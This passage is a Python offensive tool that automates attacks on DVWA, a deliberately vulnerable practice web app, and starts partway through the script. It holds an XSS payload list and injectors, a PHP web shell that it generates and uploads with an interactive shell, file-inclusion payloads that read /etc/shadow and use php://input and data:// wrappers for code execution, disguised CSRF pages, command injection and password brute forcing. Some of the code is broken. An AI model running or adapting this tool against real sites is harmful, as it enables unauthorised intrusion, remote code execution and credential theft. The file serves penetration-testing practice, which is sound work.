      print("wrong input or choice")

  get = get_data(url,cookies,db,table[0],column,data)
  print(get)

class Gun(object):
  payloads = ['<script>alert(123);</script>',
    '<ScRipT>alert("XSS");</ScRipT>',
    '<script>alert(123)</script>',
    '<script>alert("hellox worldss");</script>',
    '<script>alert(“XSS”)</script>',
    '<script>alert(“XSS”);</script>',
    '<script>alert(‘XSS’)</script>',
    '“><script>alert(“XSS”)</script>',
    '<script>alert(/XSS”)</script>',
    '<script>alert(/XSS/)</script>',
    '</script><script>alert(1)</script>',
    '‘; alert(1);',
    '‘)alert(1);//',
    '<ScRiPt>alert(1)</sCriPt>',
    '<IMG SRC=jAVasCrIPt:alert(‘XSS’)>',
    '<IMG SRC=”javascript:alert(‘XSS’);”>',
    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
    '<IMG SRC=javascript:alert(‘XSS’)>',
    '<img src=xss onerror=alert(1)>',
    '<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>',
    "<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'",
    '<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"']

  exists = os.path.isfile("payload.txt")

  if exists:
    f = codecs.open("payload.txt","r",encoding='utf-8',errors='ignore')
    payloads = f

  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies

  def Trigger(self):
    self.Reuqest()
    self.Payload()

  def Reuqest(self):

    rep = requests.get(self.url,cookies=self.cookies)
    soup = BeautifulSoup(rep.text,"html5lib")

    name_list = []
    value_list = []

    if soup.form:
      for inputs in soup.form("input"):
        Type = inputs.attrs
        if 'name' in Type and Type['type'] == 'text':
          name_list.append('name')
          value_list.append(Type['name'])
        elif Type['type'].lower() == 'submit':
          name_list.append(Type['type'])
          value_list.append(Type['value'])

    get = soup.form['method'].lower()
    if get == 'get':
      self.param = dict(zip(name_list,value_list))


  def Payload(self):

    for num,payload in enumerate(Gun.payloads,start=0):
      self.param['name'] = payload
      rep = requests.get(self.url,cookies=self.cookies,params=self.param)
      if payload in rep.text(payload):
        print("\033[1;32mvalid payload: \033[0m",payload,end='')


class Other_Gun(Gun):

  cookie = {'domain':'172.17.0.2','httponly':False,'name':'PHPSESSID','value':'24nr5an77p46e52bipuv7luv12','path':'/','secure':False}
  driver = webdriver.PhantomJS()

  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies


  def Other_Trigger(self):
    self.Driver()


  def Driver(self):


    for each in self.cookies:
      self.cookie['name'] = each
      self.cookie['value'] = self.cookies[each]
      self.driver.add_cookie(self.cookie)


    self.driver.get(self.url)
    print(self.driver.title)
    print(self.driver.current_url)
    self.source = self.driver.page_source

    if self.driver.current_url != self.url:
      while True:
        self.driver.get(self.url)
        print(self.driver.current_url)
        if self.driver.current_url == self.url:
          break

    for payload in super().payloads:
      if "meta" in payload.strip() or "refresh" in payload.strip():
        continue

      name_payload = payload
      message_payload = payload
      self.driver.execute_script("document.getElementsByTagName('textarea')[0].maxLength = 10000;")
      self.driver.execute_script("document.getElementsByTagName('input')[0].maxLength = 10000;")
      self.driver.find_element_by_name('txtName').send_keys(name_payload)
      self.driver.find_element_by_name('mtxMessage').send_keys(message_payload)
      self.driver.find_element_by_name('btnSign').click()

      if name_payload.strip() in self.driver.page_source or name_payload.strip().lower() in self.driver.page_source or name_payload in self.driver.page_source:
        print("\033[1;32m name valid payload find: \033[0m",name_payload,end='')
        print("call find")
        if self.find():
          continue

      elif message_payload.strip() in self.driver.page_source or message_payload.strip().lower() in self.driver.page_source or message_payload in self.driver.page_source:
        print("\033[1;32m name valid payload find: \033[0m",message_payload,end='')
        print("call find")
        if self.find():
          continue

      else:
        print("each don't have message")
        print("\033[1;31m"+payload+"\033[0m",end='')
        if self.find():
          continue


    self.driver.quit()



  def find(self):
    while True:
      self.driver.find_element_by_name('btnClear').click()
      self.driver.switch_to_alert
      self.driver.execute_script("window.confirm = function(msg) { return true; }")
      if "guestbook_comments" in self.driver.page_source:
          continue
      else:
        return True



class DOM(Other_Gun):


  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies


  def dom(self):
    self.dom_request()


  def dom_request(self):

    for cookie in self.cookies:
      self.cookie['name'] = cookie
      self.cookie['value'] = self.cookies[cookie]
      self.driver.add_cookie(self.cookie)

    self.driver.get(self.url)
    default = self.driver.find_element_by_tag_name("select").get_attribute('name')
    get = self.driver.find_element_by_tag_name("form").get_attribute("method")
    if get.lower() == 'get':
      Default = "?"+default+"="
      if self.cookies['security'] == 'high':
        Default = Default + "English"+"#"

    for payload in self.payloads:
      payload = payload.strip()



      url = self.url + Default + payload
      self.driver.get(url)
      value = self.driver.find_element_by_tag_name("option").get_attribute("value")

      self.driver.refresh()

      source = self.driver.page_source

      uncode = unquote(value)
      quote(payload)
      unentity = html.unescape(payload)
      one = html.unescape(quote(payload))
      two = unquote(unentity)


      if payload in source:
        print("\033[1;31mnormal\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)

      elif uncode == payload:
        print("\033[1;31mdecode\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)
      elif quote(payload) in source:
        print("\033[1;31mdecode\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)

      elif unentity in source:
        print("\033[1;31mhtml entity\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)

      elif one in source:
        print("\033[1;31muncode to html entity\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)

      elif two in source:
        print("\033[1;31mhtml entity to uncode\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)

      else:
        print("\033[1;33m"+payload+"\033[0m")



class SESSION(object):

  cookie = {'domain':'172.17.0.2','httponly':False,'name':'PHPSESSID','value':'24nr5an77p46e52bipuv7luv12','path':'/','secure':False}
  driver = webdriver.PhantomJS()

  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies

  def session(self):
    self.POST_SESSION()
    self.URL()

  def POST_SESSION(self):
    for key in self.cookies:
      self.cookie['name'] = key
      self.cookie['value'] = self.cookies[key]
      self.driver.add_cookie(self.cookie)

  def URL(self):

    while True:
      self.driver.get(self.url)
      self.driver.find_element_by_tag_name("input").click()
      print("\033[1;32mSESSION Generate!\033[0m")
      cookies = self.driver.get_cookies()

      for key in cookies:
        if "dvwaSession"  == key['name']:
          session = self.driver.get_cookie("dvwaSession")
          name = session['name']
          value = session['value']
          print(name,": ",value)
          if self.cookies['security'] == "medium":
            timestamp = int(value)
            value = datetime.datetime.fromtimestamp(timestamp)
            print("Type is unix time stamp")
            print("\033[1;33mDecode Value\033[0m",name," : ",end='')
            print(f"{value:%Y-%m-%d %H:%M:%S}")
          elif self.cookies['security'] == 'high':
            print("Type is md5 hashing asymmetric algorithm")
            count = 0
            while True:
              md5 = hashlib.md5(str(count).encode())
              if md5.hexdigest() == value:
                print("\033[1;33mMD5 Value Find %s \033[0m" % str(count))
                break
              count += 1

          elif self.cookies['security'] == 'low':
            print("Type Is Base number")

      q = input("press q to quit:")
      if q == 'q':
        self.driver.delete_all_cookies()
        self.driver.quit()
        break


class FILE(object):

  cookie = SESSION.cookie
  driver = SESSION.driver

  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies


  def file(self):
    if self.cookies['security'] == "high":
      while True:
        image = input("choice you image file:")
        server_file = input("choice you shell file:")
        tmp_img = image.split("/")[-1]
        tmp_file = server_file.split("/")[-1]
        os.system("cat "+image+" "+server_file+" > /tmp/"+tmp_img+"_"+tmp_file+".jpg")
        if os.path.isfile("/tmp/"+tmp_img+"_"+tmp_file+".jpg"):
          imagefile = "/tmp/"+tmp_img+"_"+tmp_file+".jpg"
          print("file create")
          print(imagefile)
          self.check(imagefile)
          print("you cen use thes file exploit with other vulnerability",end='')
          print(" such as file include")
          break
    else:
      self.Try()

  def Try(self):
    for key in self.cookies:
      self.cookie['name'] = key
      self.cookie['value'] = self.cookies[key]
      self.driver.add_cookie(self.cookie)

    options = ["php","choice my own file"]
    for x,i in enumerate(options,start=0):
      print(x," ",i)

    while True:
      choice = input("which type file you want to upload?:")
      if choice not in string.digits:
        print("wrong chioce,rechoice again!")
      elif choice.isdigit() and int(choice) < len(options):
        choice = int(choice)
        break

    if options[choice] == 'php':
      print("Generate File")
      rand = ''.join(random.sample(string.ascii_letters+string.digits,8))
      File = rand+"."+options[choice]
      path = os.path.exists("/tmp/")
      if path:
        call = subprocess.check_call("echo '<?php $c=chr(99);if(isset($_POST[$c]))system($_POST[$c]); ?>' > /tmp/"+File,shell=True)
        if not call:
          valid = self.check("/tmp/"+File)
          if File in valid:
            subprocess.check_call("rm /tmp/"+File,shell=True)
            print("tmp file has been removede")
            self.shell(valid)

    if options[choice] == "choice my own file":
      file_path = input("input you file path:")
      if file_path:
        if os.path.exists(file_path):
          file_check = os.path.isfile(file_path)
          if file_check:
            self.check(file_path)
            nc = input("open with ncat?:")
            if nc in "yYyesYes":
              port = input("input you listen port:")
              os.system("nc -lvnp "+port)
            else:
              sys.exit()
        else:
          print("not such file")



  def shell(self,valid):
    data = {}
    while True:
      data['c'] = input("\033[1;32mshell:\033[0m")
      rep = requests.post(valid,cookies=self.cookies,data=data)
      if not rep.ok:
        break
      print(rep.text,end='')


  def check(self,file_send):
    if self.cookies['security'] == 'medium' or self.cookies['security'] == 'high':
      files = {'uploaded':(file_send,open(file_send,'rb'),'image/png')}
      data = {'Upload':'Upload'}
      print("before")
      rep = requests.post(self.url,cookies=self.cookies,files=files,data=data)
      print("after")
      soup = BeautifulSoup(rep.text,"html5lib")
      text = soup.find_all("pre")[0].text
    elif self.cookies['security'] == 'low':
      self.driver.get(self.url)
      self.driver.find_element_by_name("uploaded").send_keys(file_send)
      self.driver.find_element_by_name("Upload").click()
      text = self.driver.find_element_by_tag_name("pre").text

    url = self.url
    count = 0
    str1 = ''
    for each in url:
      if count == 3:
        break
      if each == '/':
        count += 1
      str1 = str1 + ''.join(each)
    check_path = str1+text.split("../../")[-1].split(" ")[0]
    print("check file status")
    rep = requests.get(check_path)
    if rep.ok:
      print(check_path,"upload file valid")

    return check_path


class Include(object):


  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies

  def include(self):
    self.Test()

  def Test(self):
    if "?" not in self.url or "=" not in self.url:
      sys.exit("wrong input url,please use url end with like ?id=1 param")
    index = self.url.find("=")
    self.url = self.url[:index+1]
    print("Exploit with payloads")
    print(self.url)
    print("test with local file include")
    self.local()
    self.fake_protocol()
    sys.exit()



  def local(self):
    payload = ["/etc/issue","/etc/passwd","/etc/shadow","/etc/group","/etc/hosts",
        "/etc/motd","/etc/mysql/my.cnf","/proc/self/environ","/proc/[0-9]*/fd/[0-9]*",
        "/proc/self/environ","/proc/version","/proc/cmdline"]

    count = 0
    for each in payload:
      rep = requests.get(self.url+each,cookies=self.cookies)
      if rep.ok:
        text = rep.text.split("<!DOC")[0].strip()
        if text != '':
          print("payload valid: \033[1;32m%s\033[0m" % each)
          count += 1

    if not count:
      print("Not valid payload find")



  def fake_protocol(self):

    fake_protocol = {}

    self.php_input = "php://input"
    self.php_filter = "php://filter/read=convert.base64-encode/resource="
    self.data = "data://text/plain,<?php phpinfo(); ?>"
    self.data_base64 = "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo="
    self.file_protocol = "file:///"
    self.http_protocol = "http://"
    self.zipfile = "zip:// only work in big than 5.3.0 php version"
    self.bzip2file = "compress.bzip2://"

    protocol = ['php_input','php_filter','data','data_base64','file_protocol',\
        'http_protocol','zipfile','bzip2file','url']

    fake_protocol['php_input'] = self.php_input
    fake_protocol['php_filter'] = self.php_filter
    fake_protocol['data'] = self.data
    fake_protocol['data_base64'] = self.data_base64
    fake_protocol['file_protocol'] = self.file_protocol
    fake_protocol['http_protocol'] = self.http_protocol
    fake_protocol['zipfile'] = self.zipfile
    fake_protocol['bzip2file'] = self.bzip2file
    fake_protocol['url'] = "useing nothing only try with my url %s " % self.url


    for key,value in enumerate(fake_protocol.items()):
      print(key,"\033[1;33m"+value[0]+":\033[0m \033[1;34m"+value[1]+"\033[0m")

    print("press q to quit")
    while True:
      which = input("\033[1;32mwhich protocol you want to use?:\033[0m")
      if which.isdigit():
        if int(which) < len(protocol) and int(which) >= 0:

          if protocol[int(which)] == "php_input":
            self.PHP_INPUT()
          elif protocol[int(which)] == "php_filter":
            self.PHP_FILTER()
          elif protocol[int(which)] == "data":
            self.DATA()
          elif protocol[int(which)] == "data_base64":
            self.DATA_BASE64()
          elif protocol[int(which)] == "file_protocol":
            self.FILE_PROTOCOL()
          elif protocol[int(which)] == "http_protocol":
            self.HTTP_PROTOCOL()
          elif protocol[int(which)] == "zipfile":
            self.ZIPFILE()
          elif protocol[int(which)] == "bzip2file":
            self.BZIP2FILE()
          elif protocol[int(which)] == 'url':
            self.TRY_URL()

      elif which == 'q' or which == 'exit' or which == 'Q':
        sys.exit()


  def PHP_INPUT(self):
    print("test the php://input if valid")
    param = self.url.split("?")[-1].split("=")[0]
    data = param+"="+"<?php phpinfo(); ?>"
    rep = requests.post(self.url+self.php_input,cookies=self.cookies,data=data)
    if param+"="+"php://input" in rep.text:
      print("\033[1;32mValid\033[0m")
      print("prepare a shell")
      while True:
        code = input("\033[1;32mshell:\033[0m")
        if code == 'exit':
          break
        data = param+"="+"<?php system("+code+"); ?>"
        rep = requests.post(self.url + self.php_input,cookies=self.cookies,data=data)
        if not rep.ok:
          break
        print(rep.text.split("<!DOC")[0].strip().split("=")[-1])

    else:
      print("Not work  %s with php://input" % self.url)

    self.fake_protocol()



  def PHP_FILTER(self):
    filetoread = input("\033[1;31minput you want to read of that file:\033[0m")
    rep = requests.get(self.url+self.php_filter+filetoread,cookies=self.cookies)
    b64 = rep.text.split("<!DOC")[0].strip()
    print("\033[1;32mget out put\033[0m")
    print(b64)
    y = input("\033[1;31myou want to decode? y or n:\033[0m")
    if y in 'yYyesYesYES':
      print("\033[1;32mdecode base64\033[0m")
      print(base64.b64decode(b64).decode("ascii"))

    self.fake_protocol()


  def DATA(self):
    print("Check data://text/plain if is valid")
    rep = requests.get(self.url+self.data,cookies=self.cookies)
    check = self.url.split("?")[-1]+self.data.split(",")[0]
    if check in rep.text:
      print("\033[1;32mValid\033[0m with %s" % self.data)
      print("prepare a shell")
      while True:
        code = input("\033[1;32mshell:\033[0m")
        if code == 'exit':
          break
        param = self.data.split(",")[0] +","+"<?php system("+code+"); ?>"
        rep = requests.get(self.url+param,cookies=self.cookies)
        if not rep.ok:
          break
        print(rep.text.split("<!DOC")[0].strip())
    else:
      print("\033[1;31mNot work with \033[0m%s" % self.data)

    self.fake_protocol()


  def DATA_BASE64(self):
    print("Check with the %s " % self.data_base64)
    rep = requests.get(self.url+self.data_base64,cookies=self.cookies)
    if self.data_base64 in rep.text:
      print("\033[1;32mprepare a shell\033[0m")
      while True:
        code = input("\033[1;32mshell:\033[0m")
        code = "<?php system('"+code+"'); ?>"
        code = code.encode('ascii')
        code = base64.b64encode(code)
        code = code.decode('ascii')
        code = self.data_base64.split(",")[0] +","+code
        rep = requests.get(self.url+code,cookies=self.cookies)
        if rep.ok:
          print(rep.text.split("<!DOC")[0].strip())
        else:
          break
    else:
      print("\033[1;31mNot work wit\033[0m %s" % self.data_base64)

    self.fake_protocol()

  def FILE_PROTOCOL(self):
    while True:
      print("target local file to input")
      file_protocol = input("\033[1;31mstart with dir/file/file.*:\033[0m")
      if file_protocol == 'exit':
        print("want to brute file dir? coming soon")
        break
      rep = requests.get(self.url+self.file_protocol+file_protocol,cookies=self.cookies)
      if rep.ok:
        print("request url %s"%self.url+self.file_protocol+file_protocol)
        print(rep.text.split("<!DOC")[0].strip())

    self.fake_protocol()

  def HTTP_PROTOCOL(self):
    while True:
      Type = ["GET","POST","quit"]
      print("POST or GET?")
      for x,i in enumerate(Type,start=0):
        print(x,i)
      choice = input(":")
      if choice.isdigit():
        if int(choice) < 2:
          Type = Type[int(choice)]
        else:
          break

      if Type == 'GET':
        remote = input("\033[1;31minput you remote address url:\033[0m")
        rep = requests.get(self.url+remote,cookies=self.cookies)
        print("request url %s" % self.url+remote)
        if rep.ok:
          print(rep.text)
          print("\033[1;32mGot requet\033[0m ")
      elif Type == 'POST':
        param = input("\033[1;31minput you post data param name and value split with [:]\033[0m")
        key = param.split(":")[0]
        value = param.split(":")[1]
        data = {key:value}
        remote = input("\033[1;31minput you remote address url:\033[0m")
        rep = requests.post(self.url+remote,cookies=self.cookies,data=data)
        if rep.ok:
          print(rep.text.split("<!DOC")[0].strip())

    self.fake_protocol()

  def ZIPFILE(self):
    zipfile = input("\033[1;31mzip file you want to link withed:\033[0m")
    url = self.url+self.zipfile+zipfile
    print("\033[1;31mRequest url\033[0m %s " % url)
    rep = requests.get(url,cookies=self.cookies)
    if rep.ok:
      print(rep.text.split("<!DOC")[0].strip())

    self.fake_protocol()

  def BZIP2FILE(self):
    bzip2file = input("\033[1;31mbzip2file you want to link withed:\033[0m")
    url = self.url+self.bzip2file+bzip2file
    print("\033[1;31mRequest url\033[0m %s" % url)
    rep = requests.get(url,cookies=self.cookies)
    if rep.ok:
      print(rep.text.split("<!DOC")[0].strip())

    self.fake_protocol()

  def TRY_URL(self):
    while True:
      print("\033[1;31mYou url \033[0m%s " % self.url)
      print("\033[1;31mq to quit\033[0m")
      trY = input("\033[1;31mtry with my url:\033[0m")
      print("\033[1;31mRequest url %s\033[0m" % self.url+trY)
      rep = requests.get(self.url+trY,cookies=self.cookies)
      if trY == 'q':
        break
      if rep.ok:
        print(rep.text)

    self.fake_protocol()


class CSRF_GENERATE(object):
  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies

  def generate(self):
    options = ["Generate csrf link Poc",
    "Generate csrf html file Poc,[default type is hidden]",
    "Generate csrf domain name html file Poc,[default type is hidden]",
    "useing with javascript","q to quit"]


    while True:
      for num,op in enumerate(options,start=0):
        print("\033[1;32m",num,"\033[0m",op)

      self.op()

  def op(self):
    choice = input("\033[1;32minput you choice:\033[0m")
    if choice.isdigit():
      if int(choice) == 0:
        self.low_base()
        self.encode_base()
      elif int(choice) == 1:
        self.hidden_base()
      elif int(choice) == 2:
        self.bypass_base()
      elif int(choice) == 3:
        self.useing_with_javascript_base()
      else:
        print("\033[1;31mwrong number\033[0m")
    else:
      sys.exit("\033[1;32mquit\033[0m")

  def low_base(self):
    rep = requests.get(self.url,cookies=self.cookies)
    soup = BeautifulSoup(rep.text,"html5lib")
    method = soup.form['method']
    form = soup.form("input")
    if method.lower() == 'get':
      print("\033[1;31mLink Generate\033[0m")
      url = self.url + "?"
      password = ''.join(random.sample(string.ascii_letters+string.digits,5))
      for each in form:
        if each['type'] == 'password':
          url = url + each['name'] + "=" + password + "&"
        elif each['type'].lower() == "submit":
          url = url + each['name'] + "=" + each['value']
      print(url)

    return url

  def encode_base(self):
    print("\033[1;31myou can encode the link with online website\033[0m")

  def hidden_base(self):

    img_tag = "<img src="+self.low_base()+" border='0' style='display:none;'/>" \
        "<h1>404</h1>"\
        "<h2>file not found.<h2>"
    filename = ''.join(random.sample(string.digits+string.ascii_letters,8))+".html"

    with open(filename,"w") as f:
      f.write(img_tag)
      f.close()

    print("\033[1;31mFile Generate\033[0m")
    fileinfo = os.popen("ls -l "+filename)
    print("\033[1;33m",fileinfo.readline(),"\033[0m")


  def bypass_base(self):

    img_tag = "<img src="+self.low_base()+" border='0' style='display:none;'/>" \
        "<h1>404</h1>" \
        "<h2>file not found.<h2>"

    filename = self.url.split("http://")[1].split("/")[0]+".html"
    with open(filename,"w") as f:
      f.write(img_tag)
      f.close()

    print("\033[1;31mFile Generate\033[0m")
    fileinfo = os.popen("ls -l "+filename)
    print("\033[1;33m",fileinfo.readline(),"\033[0m")


  def useing_with_javascript_base(self):
    print("\033[1;31mcomming soon\033[0m")
    print("\033[1;31mcan use store xss get the token to exploit the csrf high level\033[0m")


class Command_Execute(object):

  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies

  def execute(self):

    self.post_code = ';'
    rep = requests.get(self.url,cookies=self.cookies)
    soup = BeautifulSoup(rep.text,"html5lib")
    post = soup.form['method'].lower()
    data = {}

    if post == 'post':
      tag = soup.form("input")

      for t in tag:
        if t['name'].lower() != 'submit':
          ip = t['name']
          data[ip] = ''
        else:
          data[t['name']] = t['value']

      while True:
        code = input("\033[1;32mshell:\033[0m")
        data[ip] = self.post_code+code
        rep = requests.post(self.url,cookies=self.cookies,data=data)
        soup = BeautifulSoup(rep.text,"html5lib")
        print(soup.pre.text,end='')

        if code == 'q':
          sys.exit('quit...')

        if soup.pre.text == '':

          for i,x in enumerate(['try to change the post code']):
            print("\033[1;31m",i,"\033[0m",x)
          choice = input("\033[1;32mnot work?:\033[0m")

          if choice == '0':
            print("input you post code,such as")
            post_code = ["&",";",'|','||','&&']
            for x in post_code:
              print("\033[1;32m"+x+"\033[0m")
            self.post_code  = input(":")
            print("post code has been change")
            print("You post code \033[1;32m%s\033[0m " % self.post_code)

          if choice == 'q':
            sys.exit('quit...')






class Brute(object):
  count = 0

  def __init__(self,url,cookies):

    self.url = url
    self.cookies = cookies

  def force(self):
    self.orgin = requests.get(self.url,cookies=self.cookies)
    self.user = input("\033[1;31minput a single username or username file path:\033[0m")
    self.password = input("\033[1;31minput a single password or password file path:\033[0m")

    user_exists = os.path.isfile(self.user)
    pass_exists = os.path.isfile(self.password)

    rep = requests.get(self.url,cookies=self.cookies)
    soup = BeautifulSoup(rep.text,"html5lib")

    method = soup.form['method']
    form = soup.form("input")

    if method.lower() == 'get':
      self.url = self.url+"?"
      for each in form:
        if each['type'].lower() == 'text':
          self.url = self.url + each['name'] + "=" + self.user + "&"
        elif each['type'].lower() == 'password':
          self.url = self.url + each['name'] + "=" +self.password + "&"
        elif each['type'].lower() == 'submit':
          self.url = self.url + each['name'] + "=" + each['value']

    if user_exists and pass_exists:
      self.both()

    elif user_exists and not pass_exists:
      self.single_password()

    elif pass_exists and not user_exists:
      self.single_username()

    elif not user_exists and not pass_exists:
      self.single()

    else:
      print("wrong input,quit...")
      sys.exit()

  def Token(self):
    rep = requests.get(self.url,cookies=self.cookies)
    soup = BeautifulSoup(rep.text,"html5lib")
    token = soup.form("input")[3]['name']
    value = soup.form("input")[3]['value']
    return "&"+token+"="+value

  def single_username(self):

    url = self.url.split("&")

    with open(self.password,'r') as pass_f:
      for pas in pass_f:
        force = url[0]+"&"+url[1].split("=")[0]+"="+pas.split("\n")[0]+"&"+url[2]
        if self.cookies['security'] == 'high':
          rep = requests.get(force+self.Token(),cookies=self.cookies)
        else:
          rep = requests.get(force,cookies=self.cookies)
        print("Check %s:%s" % (self.user,pas.split("\n")[0]))
        if self.check(rep.text,self.user):
          print("\033[1;32mUsername and Password Hint -> %s:%s\033[32m" % (self.user,pas.split("\n")[0]))
          pass_f.close()
          sys.exit()



  def single_password(self):
    url = self.url.split("&")
    with open(self.user,'r') as user_f:
      for name in user_f:
        force = url[0].split("=")[0] +"="+name.split("\n")[0] + "&" + url[1] + \
            "&" + url[2]
        if self.cookies['security'] == 'high':
          rep = requests.get(force+self.Token(),cookies=self.cookies)
        else:
          rep = requests.get(force,cookies=self.cookies)
        if self.check(rep.text,'',self.password):
          print("\033[1;32mUsername and Password Hint -> %s:%s\033[32m" % (name.split("\n")[0],self.password))
          user_f.close()
          sys.exit()




  def both(self):
    url = self.url.split("&")

    with open(self.user,'r') as user_f:
      with open(self.password,'r') as pass_f:
        for name in user_f:
          for pas in pass_f:
            Name = name.split("\n")[0]
            Pass = pas.split("\n")[0]
            N = url[0].split("=")[0]+"="+Name
            P = url[1].split("=")[0]+"="+Pass
            force  = N.strip()+"&"+P.strip()+"&"+url[2]
            if self.cookies['security'] == 'high':
              rep = requests.get(force+self.Token(),cookies=self.cookies)
            else:
              rep = requests.get(force,cookies=self.cookies)
            print("Check %s:%s" % (Name,Pass))

            if self.check(rep.text,Name,Pass):
              print("\033[1;32mUsername and Password Hint -> %s:%s\033[32m" % (Name,Pass))
              pass_f.close()
              user_f.close()
              sys.exit()

          pass_f.seek(0)


  def single(self):
    if self.cookies['security'] == 'high':
      rep = requests.get(self.url+self.Token(),cookies=self.cookies)
    else:
      rep = requests.get(force,cookies=self.cookies)
    self.check(rep.text)


  def check(self,text,N='',P=''):
    if "Username and/or password incorrect." not in text and "CSRF token is incorrect" not in text and "Welcome" in text:
      if N != '' and P != '':
        return True
      elif N != '':
        print(text)
        return True
      elif P != '':
        print(text)
        return True
      print("\033[1;32mUsername and Password Hint -> %s:%s\033[32m" % (self.user,self.password))
      sys.exit()

"""
############## for some test

def BRUTE(url,cookies):
  password = "/usr/share/seclists/Passwords/probable-v2-top12000.txt"
  link = url+"?username=admin&password="
  rep = requests.get(url,cookies=cookies)
  print(url)
  print(rep.text)
  soup = BeautifulSoup(rep.text,"html5lib")
  token = soup.form("input")[-1]['value']
  count = 0
  with open(password,"r") as pass_f:
    for each in pass_f:
      each = each.split("\n")[0]
      print(link+each+"&Login=Login&user_token="+token)
      rep = requests.get(link+each+"&Login=Login&user_token="+token,cookies=cookies)
      print(rep.text)
      soup = BeautifulSoup(rep.text,"html5lib")
      token = soup.form("input")[-1]['value']
      print(token)
      count += 1
      if count == 4:
        break
"""


@click.command()
@click.option('--cookie_name',default='',help='add cookie name,separate by [,]')
@click.option('--cookie_value',default='',help='add cookie value,separate by [,]')
@click.option("--basesql",is_flag=True,help="to set the base sql injection exploit")
@click.option("--blindsql",is_flag=True,help="to set the blind sql injection exploit")
@click.option("--xss_reflected",is_flag=True,help="to set the xss reflected exploit")
@click.option("--xss_stored",is_flag=True,help="to set the xss stored exploit")
@click.option("--xss_dom",is_flag=True,help="to set the xss dom exploit")
@click.option("--weak_session",is_flag=True,help="to set the weak session exploit")
@click.option("--file_upload",is_flag=True,help="to set the file upload  exploit")
@click.option("--file_include",is_flag=True,help="set to exploit the file include")
@click.option("--csrf",is_flag=True,help="set to exploit the csrf")
@click.option("--command_execute",is_flag=True,help="exploit the command line")
@click.option("--brute_force",is_flag=True,help="brute the username or password")
@click.argument("url")




def options_get(url,cookie_name,cookie_value,basesql,blindsql \
    ,xss_reflected,xss_stored,xss_dom,weak_session,file_upload \
    ,file_include,csrf,command_execute,brute_force):

  if len(cookie_name.split(",")) > 1 and len(cookie_value.split(",")) > 1:
    namelist = cookie_name.split(",")
    valuelist = cookie_value.split(",")

    if len(namelist) == len(valuelist):
      e = dict(zip(namelist,valuelist))
    else:
      print("cookie name and value not compare:")
      print("cookie_name :",cookie_name)
      print("cookie_value:",cookie_value)
      sys.exit()

  elif len(cookie_name.split(",")) == 1 and  len(cookie_value.split(",")) == 1:
    e = {cookie_name:cookie_value}

  else:
    print("cookie_name not compare number wrong")


  try:
    if e[cookie_name] == '':
      print("You need set cookies!")
    elif e['']:
      print("You need set cookies!")
  except (KeyError):
    pass

  if 'security' in e and basesql:
    level = e['security']
    if level == "low":
      sql_error_test(url,cookies=e)
      return

    elif level == "medium":
      sql_error_level2_test(url,cookies=e)
      return

    elif level == "high":
      high(url,cookies=e)
      return

    elif level == 'impossible':
      print("impossible level is safe code,not need to test")
    else:
      print("wrong level has been set")
  if 'security' not in e:
    print("missing security level cookies")

  if 'security' in e and blindsql:
    level = e['security']
    if level == "low":
      blind_low_enum(blind_low(url,cookies=e))
      return
    elif level == 'medium':
      post_blind(url,cookies=e)
      return
    elif level == "high":
      high_level_blind(url,cookies=e)
      return

  if xss_reflected:
    trigger = Gun(url,cookies=e)
    trigger.Trigger()
    return

  elif xss_stored:
    other_trigger = Other_Gun(url,cookies=e)
    other_trigger.Other_Trigger()
    return

  elif xss_dom:
    dom = DOM(url,cookies=e)
    dom.dom()
    return
  elif weak_session:
    session = SESSION(url,cookies=e)
    session.session()
    return
  elif file_upload:
    File = FILE(url,cookies=e)
    File.file()
    return
  elif file_include:
    include = Include(url,cookies=e)
    include.include()
    return
  elif csrf:
    csrf  = CSRF_GENERATE(url,cookies=e)
    csrf.generate()
    return
  elif command_execute:
    command = Command_Execute(url,cookies=e)
    command.execute()
    return
  elif brute_force:
    brute = Brute(url,cookies=e)
    brute.force()
    return

if __name__=="__main__":
  options_get()
